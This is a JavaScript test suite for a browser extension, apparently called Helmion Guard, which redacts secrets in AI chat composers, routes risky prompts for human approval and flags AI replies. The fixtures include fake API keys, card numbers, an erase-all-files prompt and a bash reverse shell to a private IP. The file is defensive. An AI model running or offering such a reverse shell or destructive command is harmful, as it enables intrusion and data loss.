// The active interceptor, the verification loop and the Flags lane, running as
// Chrome runs them: all seven content scripts in manifest order, messages routed
// to the REAL background worker, and (where stated) a REAL Executive Guard
// server on loopback.
//
// What it does NOT prove: that the live claude.ai / chatgpt.com / gemini /
// grok.com composers accept the redacted text the same way (rich editors
// differ), or how the cards look. Those need a browser.

import test from 'node:test';
import assert from 'node:assert/strict';
import { loadContentScripts } from '../test-support/load-content-script.mjs';
import { element, createDocument } from '../test-support/mini-dom.mjs';
import { chrome, fake, installWorker } from '../test-support/fake-chrome.mjs';
import { startGuard, APPROVER_TOKEN, DEVICE_TOKEN } from '../../executive-guard/test-support/helpers.mjs';
import { MOCK_KEY, startMockFlagsApi, SERVER_ONLY_SAMPLE } from '../test-support/mock-flags-api.mjs';

await installWorker();

const CONTENT_SCRIPTS = [
  'content/prompt-risk.js',
  'content/sanitize.js',
  'content/flags.js',
  'content/extract.js',
  'content/stream-watch.js',
  'content/ui.js',
  'content/guard.js',
];

const wait = (ms) => new Promise((resolve) => { setTimeout(resolve, ms); });

async function waitFor(predicate, { timeout = 3000, step = 20 } = {}) {
  const end = Date.now() + timeout;
  while (Date.now() < end) {
    if (predicate()) return true;
    await wait(step);
  }
  return predicate();
}

async function runExtension(children) {
  fake.reset();
  const doc = createDocument(children);
  const windowListeners = new Map();
  const fakeWindow = {
    location: { hostname: 'chatgpt.com' },
    addEventListener(type, handler) {
      if (!windowListeners.has(type)) windowListeners.set(type, []);
      windowListeners.get(type).push(handler);
    },
    dispatch(type, event = {}) {
      event.type = event.type || type;
      (windowListeners.get(type) || []).forEach((handler) => handler(event));
    },
  };
  const observers = [];
  class FakeMutationObserver {
    constructor(callback) { this.callback = callback; observers.push(this); }
    observe() {}
    disconnect() {}
  }
  await loadContentScripts(CONTENT_SCRIPTS, {
    document: doc,
    chrome,
    MutationObserver: FakeMutationObserver,
    window: fakeWindow,
    crypto: globalThis.crypto,
    TextEncoder,
    setInterval() { return 0; },
  });
  return { doc, fakeWindow };
}

function sendEnter(fakeWindow, target) {
  const event = { target, key: 'Enter', prevented: false, stopped: false };
  event.preventDefault = () => { event.prevented = true; };
  event.stopImmediatePropagation = () => { event.stopped = true; };
  fakeWindow.dispatch('keydown', event);
  return event;
}

const askAlerts = (doc) => doc.querySelectorAll('.helmion-guard-ask-alert');
const flagAlerts = (doc) => doc.querySelectorAll('.helmion-guard-flag-alert');
const button = (doc, id) => doc.querySelector(`[data-helmion-action="${id}"]`);
const ledgerRows = () => fake.storageBag.get('helmion.ledger.v1') || [];

function textarea(value) {
  const node = element('textarea', { 'aria-label': 'Message ChatGPT' });
  node.value = value;
  return node;
}

// ─── privacy lane, local policy (no Executive Guard configured) ─────────────

test('A SECRET IS NOT SENT: Enter is cancelled and the local policy denies it', async () => {
  fake.resetStorage();
  const composer = textarea('deploy with key sk-proj-abcdefghijklmnop1234 please');
  const { doc, fakeWindow } = await runExtension([composer]);
  await wait(40);

  const event = sendEnter(fakeWindow, composer);
  assert.equal(event.prevented, true, 'the send went through');
  assert.equal(event.stopped, true, 'the site could still see the send');

  assert.ok(await waitFor(() => /stopped this message/i.test(askAlerts(doc)[0]?.textContent || '')), 'no deny card');
  const card = askAlerts(doc)[0];
  assert.match(card.textContent, /an API key/);
  assert.match(card.textContent, /Guard policy on this computer/);
  assert.equal(button(doc, 'send-anyway'), null, 'a denied secret must not offer "send as written"');
});

test('REDACT AND KEEP EDITING replaces the composer text; the redacted text then sends', async () => {
  fake.resetStorage();
  const composer = textarea('my password: hunter2xyz ok?');
  const { doc, fakeWindow } = await runExtension([composer]);
  await wait(40);
  sendEnter(fakeWindow, composer);
  assert.ok(await waitFor(() => button(doc, 'redact')));
  button(doc, 'redact').dispatch('click', {});
  assert.equal(composer.value, 'my password: [REDACTED:secret_assignment] ok?');
  assert.equal(askAlerts(doc).length, 0);

  const again = sendEnter(fakeWindow, composer);
  assert.equal(again.prevented, false, 'the redacted message was still blocked');
});

const pills = (doc) => doc.querySelectorAll('.helmion-guard-approval-pill');

test('PERSONAL DETAILS ASK: the corner pill\'s explicit Allow lets exactly that text through once', async () => {
  fake.resetStorage();
  const composer = textarea('email the report to jordan.lee@gmail.com');
  const { doc, fakeWindow } = await runExtension([composer]);
  await wait(40);

  assert.equal(sendEnter(fakeWindow, composer).prevented, true);
  assert.ok(await waitFor(() => button(doc, 'allow')), 'no approval pill');
  assert.equal(pills(doc).length, 1);
  assert.equal(askAlerts(doc).length, 0, 'the big card no longer covers the chat');
  assert.equal(doc.querySelector('.helmion-guard-approval-pill-details').hidden, true, 'pill starts collapsed');
  button(doc, 'expand').dispatch('click', {});
  assert.equal(doc.querySelector('.helmion-guard-approval-pill-details').hidden, false, 'pill expands for details');
  assert.match(pills(doc)[0].textContent, /an email address/);
  assert.equal(sendEnter(fakeWindow, composer).prevented, true, 'nothing is allowed before an explicit Allow');
  button(doc, 'allow').dispatch('click', {});

  assert.equal(sendEnter(fakeWindow, composer).prevented, false, 'the approved text was blocked');
  await wait(1600);
  composer.value = 'email the report to jordan.lee@gmail.com and sam@gmail.com';
  assert.equal(sendEnter(fakeWindow, composer).prevented, true, 'a DIFFERENT text rode on the approval');
});

test('ledger rows for the privacy lane never contain the raw secret', async () => {
  fake.resetStorage();
  const composer = textarea('token ghp_abcdefghijklmnopqrstuvwx12');
  const { fakeWindow } = await runExtension([composer]);
  await wait(40);
  sendEnter(fakeWindow, composer);
  assert.ok(await waitFor(() => ledgerRows().length > 0));
  const rows = JSON.stringify(ledgerRows());
  assert.doesNotMatch(rows, /ghp_abcdefghij/);
  assert.match(rows, /paused-before-send/);
});

test('a clean message is not touched', async () => {
  fake.resetStorage();
  const composer = textarea('How do I center a div?');
  const { doc, fakeWindow } = await runExtension([composer]);
  await wait(40);
  assert.equal(sendEnter(fakeWindow, composer).prevented, false);
  await wait(60);
  assert.equal(askAlerts(doc).length, 0);
});

test('PASTE: a secret pasted into the composer is redacted before it lands', async () => {
  fake.resetStorage();
  const composer = textarea('here: ');
  composer.selectionStart = 6;
  composer.selectionEnd = 6;
  const { doc, fakeWindow } = await runExtension([composer]);
  await wait(40);
  const event = {
    target: composer,
    clipboardData: { getData: () => 'AWS key AKIAABCDEFGHIJKLMNOP' },
    preventDefault() { event.prevented = true; },
    stopImmediatePropagation() {},
  };
  fakeWindow.dispatch('paste', event);
  assert.equal(event.prevented, true);
  assert.equal(composer.value, 'here: AWS key [REDACTED:api_key]');
  assert.match(askAlerts(doc)[0].textContent, /redacted your paste/i);
});

test('PASTE: ordinary text and personal details paste normally', async () => {
  fake.resetStorage();
  const composer = textarea('');
  const { fakeWindow } = await runExtension([composer]);
  await wait(40);
  for (const pasted of ['function add(a, b) { return a + b; }', 'call me at 720-867-5309']) {
    const event = { target: composer, clipboardData: { getData: () => pasted }, preventDefault() { event.prevented = true; }, stopImmediatePropagation() {} };
    fakeWindow.dispatch('paste', event);
    assert.equal(event.prevented, undefined, `blocked a paste: ${pasted}`);
  }
});

test('the destructive-prompt block still works exactly as before alongside the privacy lane', async () => {
  fake.resetStorage();
  const composer = textarea('Permanently erase all computer files.');
  const { doc, fakeWindow } = await runExtension([composer]);
  await wait(40);
  assert.equal(sendEnter(fakeWindow, composer).prevented, true);
  assert.equal(doc.querySelectorAll('.helmion-guard-prompt-alert').length, 1);
  await wait(100);
  assert.equal(askAlerts(doc).length, 0, 'with no Executive Guard paired, no approval card appears');
});

// ─── the verification loop through the real worker and a real server ────────

async function pairWorker(guard) {
  const keys = await guard.call('GET', '/v1/keys');
  fake.storageBag.set('helmion.executive.settings', {
    enabled: true,
    serverUrl: guard.base,
    deviceToken: DEVICE_TOKEN,
    pinned: { keyId: keys.body.keyId, publicKeyJwk: keys.body.publicKeyJwk },
  });
}

test('LOOP: a destructive prompt goes to Executive Guard, an approver approves, and that text may then be sent once', async () => {
  fake.resetStorage();
  const guard = await startGuard();
  try {
    await pairWorker(guard);
    const composer = textarea('Permanently erase all computer files on the scratch VM.');
    const { doc, fakeWindow } = await runExtension([composer]);
    await wait(40);

    assert.equal(sendEnter(fakeWindow, composer).prevented, true);
    assert.ok(await waitFor(() => /Executive Guard for approval/i.test(askAlerts(doc)[0]?.textContent || '')), 'no approval card');
    const pending = (await guard.call('GET', '/v1/approvals?status=pending', { token: APPROVER_TOKEN })).body.approvals;
    assert.equal(pending.length, 1);
    assert.deepEqual(pending[0].action.riskSignals, ['destructive-intent']);

    await guard.call('POST', `/v1/approvals/${pending[0].id}/decide`, { token: APPROVER_TOKEN, body: { approve: true } });
    assert.ok(await waitFor(() => /Approved in Executive Guard/.test(askAlerts(doc)[0]?.textContent || ''), { timeout: 6000 }), 'approval never arrived');
    assert.match(askAlerts(doc)[0].textContent, /Approved by troy/);

    assert.equal(sendEnter(fakeWindow, composer).prevented, false, 'the approved text was still blocked');
    const events = guard.audit.all().map((e) => e.event);
    assert.deepEqual(events, ['approval.requested', 'approval.approved', 'decision.issued']);
  } finally { await guard.close(); }
});

test('LOOP: a secret is denied by Executive Guard and the card says who decided', async () => {
  fake.resetStorage();
  const guard = await startGuard();
  try {
    await pairWorker(guard);
    const composer = textarea('card 4242 4242 4242 4242 exp 11/29');
    const { doc, fakeWindow } = await runExtension([composer]);
    await wait(40);
    sendEnter(fakeWindow, composer);
    assert.ok(await waitFor(() => /Decided by Executive Guard/.test(askAlerts(doc)[0]?.textContent || '')));
    const issued = guard.audit.all().find((e) => e.event === 'decision.issued');
    assert.equal(issued.verdict, 'deny');
    assert.doesNotMatch(JSON.stringify(guard.audit.all()), /4242 4242/);
  } finally { await guard.close(); }
});

test('LOOP: Executive Guard down -> the local policy decides and the card says so', async () => {
  fake.resetStorage();
  const guard = await startGuard();
  await pairWorker(guard);
  await guard.close();
  const composer = textarea('ping jordan.lee@gmail.com');
  const { doc, fakeWindow } = await runExtension([composer]);
  await wait(40);
  sendEnter(fakeWindow, composer);
  assert.ok(await waitFor(() => /could not be reached/.test(pills(doc)[0]?.textContent || '')));
  assert.ok(button(doc, 'allow') && button(doc, 'deny'));
});

// ─── Flags lane ─────────────────────────────────────────────────────────────

test('FLAGS: an evasive reply, a leaked key and a reverse shell each raise a card and a ledger row', async () => {
  fake.resetStorage();
  const { doc } = await runExtension([
    element('div', { 'data-message-author-role': 'assistant' }, [
      element('p', {}, ["I'm sorry, but I can't help with that request."]),
      element('p', {}, ['Use this key: sk-proj-abcdefghijklmnop1234']),
      element('pre', {}, [element('code', {}, ['bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'])]),
    ]),
  ]);
  assert.ok(await waitFor(() => flagAlerts(doc).length === 3), `expected 3 flag cards, got ${flagAlerts(doc).length}`);
  const kinds = flagAlerts(doc).map((card) => card.getAttribute('data-helmion-flag-kind')).sort();
  assert.deepEqual(kinds, ['evasion', 'harmful-code', 'privacy-leak']);
  assert.doesNotMatch(flagAlerts(doc).map((c) => c.textContent).join(' '), /abcdefghijklmnop1234/,
    'a flag card repeated the leaked key');
  assert.ok(await waitFor(() => ledgerRows().filter((r) => r.kind === 'ai-flag').length >= 3));
  assert.doesNotMatch(JSON.stringify(ledgerRows()), /abcdefghijklmnop1234/);
});

test('FLAGS: nothing on the page is hidden by a flag, and the red badge is untouched', async () => {
  fake.resetStorage();
  const leak = element('p', {}, ['Your SSN is 123-45-6789.']);
  await runExtension([leak]);
  await wait(80);
  assert.equal(leak.classList.contains('helmion-guard-masked'), false);
  const badge = fake.badgeCalls.filter((c) => c.call === 'setBadgeText').pop();
  assert.equal(badge ? badge.text : '', '');
});

test('FLAGS: the person\'s own draft in the composer is not flagged as an AI leak', async () => {
  fake.resetStorage();
  const { doc } = await runExtension([
    element('div', { contenteditable: 'true', role: 'textbox' }, [element('p', {}, ['my key sk-proj-abcdefghijklmnop1234'])]),
  ]);
  await wait(80);
  assert.equal(flagAlerts(doc).length, 0);
});

test('FLAGS: a clean reply raises nothing, and a flag is not raised twice', async () => {
  fake.resetStorage();
  const { doc } = await runExtension([element('p', {}, ['Use Array.prototype.flat() to flatten one level.'])]);
  await wait(80);
  assert.equal(flagAlerts(doc).length, 0);

  fake.resetStorage();
  const refusal = element('p', {}, ["I can't help with that."]);
  const second = await runExtension([refusal]);
  assert.ok(await waitFor(() => flagAlerts(second.doc).length === 1));
  await wait(200);
  assert.equal(flagAlerts(second.doc).length, 1);
});

test('FLAGS: at most three cards at once', async () => {
  fake.resetStorage();
  const { doc } = await runExtension([
    element('p', {}, ["I can't help with that."]),
    element('p', {}, ['I cannot provide that information.']),
    element('p', {}, ['His SSN is 123-45-6789.']),
    element('p', {}, ['Her email is jordan.lee@gmail.com.']),
    element('p', {}, ['The admin password: Tr0ub4dor99']),
  ]);
  await wait(150);
  assert.equal(flagAlerts(doc).length, 3);
});

// ─── Flags account (mock of the real Flags API) through the real worker ─────

function enableFlags(api, extra = {}) {
  fake.storageBag.set('helmion.flags.settings', { enabled: true, baseUrl: api.url, apiKey: MOCK_KEY, ...extra });
}

test('FLAGS ACCOUNT: a flag on the page becomes one POST /api/flags with source_ai, url and a redacted excerpt', async () => {
  fake.resetStorage();
  const api = await startMockFlagsApi();
  try {
    enableFlags(api);
    await runExtension([element('div', { 'data-message-author-role': 'assistant' }, [
      element('p', {}, ['Use this key: sk-proj-abcdefghijklmnop1234']),
    ])]);
    assert.ok(await waitFor(() => api.requests.length >= 1), 'nothing reached the Flags API');
    const req = api.requests[0];
    assert.equal(req.path, '/api/flags');
    assert.equal(req.headers.authorization, `Bearer ${MOCK_KEY}`);
    assert.equal(req.body.source_ai, 'chatgpt');
    assert.equal(req.body.url, 'https://chatgpt.com/c/test-conversation');
    assert.equal(req.body.category, 'secret');
    assert.doesNotMatch(req.raw, /abcdefghijklmnop1234/);
    assert.match(req.body.reporter, /^guard-extension\//);
  } finally { await api.close(); }
});

test('FLAGS ACCOUNT: off by default, a flag on the page sends nothing', async () => {
  fake.resetStorage();
  const api = await startMockFlagsApi();
  try {
    const { doc } = await runExtension([element('p', {}, ["I can't help with that."])]);
    assert.ok(await waitFor(() => flagAlerts(doc).length === 1));
    await wait(100);
    assert.equal(api.requests.length, 0);
  } finally { await api.close(); }
});

test('FLAGS SCAN: off by default, a clean message sends with no scanner call', async () => {
  fake.resetStorage();
  const api = await startMockFlagsApi();
  try {
    enableFlags(api);
    const composer = textarea('How do I center a div?');
    const { fakeWindow } = await runExtension([composer]);
    await wait(60);
    assert.equal(sendEnter(fakeWindow, composer).prevented, false);
    await wait(60);
    assert.equal(api.requests.filter((r) => r.path === '/api/flags/scan').length, 0);
  } finally { await api.close(); }
});

test('FLAGS SCAN: the scanner finds a secret Guard missed; the send is held and Redact uses the scanner copy', async () => {
  fake.resetStorage();
  const api = await startMockFlagsApi();
  try {
    enableFlags(api, { scanBeforeSend: true });
    const secret = SERVER_ONLY_SAMPLE;
    const composer = textarea(`webhook secret is ${secret} ok`);
    const { doc, fakeWindow } = await runExtension([composer]);
    await wait(60);
    assert.equal(sendEnter(fakeWindow, composer).prevented, true, 'the message went out before the scanner answered');
    assert.ok(await waitFor(() => /found something Guard missed/.test(askAlerts(doc)[0]?.textContent || '')), 'no scanner card');
    assert.match(askAlerts(doc)[0].textContent, /server-only test token/);
    assert.equal(api.flags.length, 0, 'the scan stored nothing');
    assert.doesNotMatch(JSON.stringify(ledgerRows()), new RegExp(secret));
    button(doc, 'redact').dispatch('click', {});
    assert.equal(composer.value, 'webhook secret is [REDACTED:server_only_test_token] ok');
  } finally { await api.close(); }
});

test('FLAGS SCAN: clean -> press Send again; scanner down -> Guard\'s own check stands and the card says so', async () => {
  fake.resetStorage();
  const api = await startMockFlagsApi();
  try {
    enableFlags(api, { scanBeforeSend: true });
    const composer = textarea('How do I center a div?');
    const { doc, fakeWindow } = await runExtension([composer]);
    await wait(60);
    assert.equal(sendEnter(fakeWindow, composer).prevented, true);
    assert.ok(await waitFor(() => /Flags scanner found nothing/.test(askAlerts(doc)[0]?.textContent || '')));
    assert.equal(sendEnter(fakeWindow, composer).prevented, false, 'a clean, checked message was still blocked');
    assert.equal(ledgerRows().filter((r) => r.kind === 'ai-flag').length, 0, 'a clean check must not log a flag');

    await wait(1600);
    api.state.failWith = 503;
    composer.value = 'And vertically?';
    assert.equal(sendEnter(fakeWindow, composer).prevented, true);
    assert.ok(await waitFor(() => /did not check this/.test(askAlerts(doc)[0]?.textContent || '')));
    assert.equal(sendEnter(fakeWindow, composer).prevented, false);
  } finally { await api.close(); }
});
